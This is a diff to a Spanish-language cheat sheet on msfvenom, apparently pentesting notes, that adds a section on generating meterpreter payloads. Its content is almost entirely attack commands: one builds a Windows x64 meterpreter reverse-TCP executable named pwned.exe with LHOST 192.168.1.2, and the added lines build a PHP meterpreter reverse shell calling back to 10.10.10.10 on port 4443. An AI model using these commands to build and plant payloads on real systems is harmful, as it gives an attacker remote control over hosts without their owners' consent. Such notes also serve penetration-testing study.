@@ -1,8 +1,8 @@
 # 💉 Msfvenom
 
-## Generación de payloads
+## Generación de payloads meterpreter
 
-### Reverse Shell TCP con EXE
+### Meterpreter Reverse Shell TCP con EXE
 
 Para generar un payload, debemos de usar la siguiente sintaxis:
 
@@ -23,6 +23,14 @@ Puede que nos de un error de arquitectura, en este caso, usaremos este comando e
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4242 -f exe -o pwned.exe
 ```
 {% endhint %}
+
+### Meterpreter Reverse Shell TCP con PHP
+
+```bash
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php
+```
+
+## Generación de payloads reverse shell
 
 ### Reverse Shell TCP con PHP
 
